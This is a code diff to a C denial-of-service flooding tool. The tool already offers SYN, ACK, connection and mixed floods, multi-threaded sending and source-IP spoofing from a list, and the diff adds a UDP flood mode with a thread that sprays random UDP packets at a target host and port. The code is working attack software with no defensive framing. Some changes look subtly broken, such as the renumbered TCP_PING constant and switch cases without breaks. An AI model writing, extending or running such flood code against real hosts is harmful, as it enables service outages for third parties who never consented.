@@ -13,10 +13,11 @@
 #include <sys/time.h>
 #include <pthread.h>
 
+#define TCP_PING   0
 #define CONN_FLOOD 1
 #define SYN_FLOOD  2
 #define ACK_FLOOD  3
-#define TCP_PING   4
+#define UDP_FLOOD  4
 #define MIX_FLOOD  5
 #define MIX2_FLOOD 6
 
@@ -345,6 +346,33 @@ void *ack_flood_attack_thread(void *param)
     return NULL;
 }
 
+/* UDP flood */
+void *udp_flood_attack_thread(void *param)
+{
+    struct leef_handle leef;
+    if(!leef_init(&leef, INJECTING))
+        return NULL;
+
+    uint32_t data[2];
+    uint8_t data_size = 8;
+
+    while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
+        data[0] = leef_random_u32();
+        data[1] = leef_random_u32();
+        leef_send_udp_data(&leef,
+                           get_src_ip(), dest_addr,
+                           leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
+                           leef_random_u16(),
+                           data_size, (uint8_t*)data);
+        if(sleep_interval)
+            usleep(sleep_interval);
+    }
+
+    leef_terminate(&leef);
+    running = 0;
+    return NULL;
+}
+
 /* MIX flood */
 void *mix_flood_attack_thread(void *param)
 {
@@ -551,6 +579,7 @@ void print_help(char **argv)
     printf("  -A                - ACK flood\n");
     printf("  -M                - Mixed S/A/PA/FA flood\n");
     printf("  -N                - Mixed A/PA/FA flood\n");
+    printf("  -U                - UDP flood\n");
     printf("General options:\n");
     printf("  -i [interface]    - Which interface to do the action (required)\n");
     printf("  -h [host]         - Target host (required)\n");
@@ -563,7 +592,7 @@ void print_help(char **argv)
     printf("  --help            - Print this help\n");
     printf("Connection flood options:\n");
     printf("  -d [binary file]  - Send binary file as data\n");
-    printf("SYN/ACK flood options:\n");
+    printf("SYN/ACK/UDP flood options:\n");
     printf("  -m [threads]      - Number of send threads (default: 1)\n");
     printf("  -f [text file]    - Read a list of IPs from a text file for spoofing\n");
 }
@@ -608,6 +637,9 @@ int main(int argc, char **argv)
                     break;
                 case 'N':
                     action = MIX2_FLOOD;
+                    break;
+                case 'U':
+                    action = UDP_FLOOD;
                     break;
                 case 'i':
                     interface = argv[++arg];
@@ -773,6 +805,11 @@ int main(int argc, char **argv)
             if(!quiet) printf("ACK FLOOD %s:%d\n", hostname, dest_port);
             for(i=0; i < num_threads; ++i)
                 pthread_create(&threads[i], NULL, ack_flood_attack_thread, NULL);
+            interface_tx_thread();
+        case UDP_FLOOD:
+            if(!quiet) printf("UDP FLOOD %s:%d\n", hostname, dest_port);
+            for(i=0; i < num_threads; ++i)
+                pthread_create(&threads[i], NULL, udp_flood_attack_thread, NULL);
             interface_tx_thread();
         case MIX_FLOOD:
             if(!quiet) printf("MIX FLOOD %s:%d\n", hostname, dest_port);
